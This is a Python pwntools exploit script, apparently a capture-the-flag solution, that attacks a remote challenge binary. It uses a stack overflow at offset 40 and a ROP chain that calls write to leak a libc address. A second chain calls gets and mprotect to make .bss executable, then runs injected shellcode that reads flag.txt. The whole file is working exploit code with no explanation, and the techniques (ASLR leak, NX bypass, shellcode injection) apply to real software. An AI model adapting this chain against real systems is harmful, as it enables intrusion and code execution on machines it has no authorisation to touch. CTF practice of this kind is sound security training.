from pwn import *
context.binary = elf = ELF("./chall", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

ret = 0x401016
write = 0x401441
'''
mov edi, 1
mov edx, 8
call _write
'''
# io = elf.process()
# gdb.attach(io)
io = remote("host.cg21.metaproblems.com",3030)

payload = flat({
	40: [
		ret,
		write,
		p64(0)*3,
		elf.sym['vuln']
	]
})
io.sendline(str(len(payload)))
io.send(payload)
io.readline()
leak = u64(io.read(7)+b"\x00")
libc.address = leak - (libc.sym['__libc_start_call_main'] +103)

pop_rdi = libc.address + 0x8ff1d
pop_rdx = libc.address + 0x8ef1b

payload = flat({
	40:[
		pop_rdi,
		elf.bss(0x30),
		libc.symbols['gets'],
		
		ret,
		pop_rdi,
		elf.bss(0x30),
		libc.symbols['gets'],

		pop_rdi,
		0x404000,
		pop_rdx,
		0x7,
		libc.symbols['mprotect'],

		elf.bss(0x30),
	]
})
io.sendline(str(len(payload)))
io.send(payload)

sc = asm(shellcraft.amd64.linux.cat("flag.txt"))
io.sendline(sc)

io.stream()
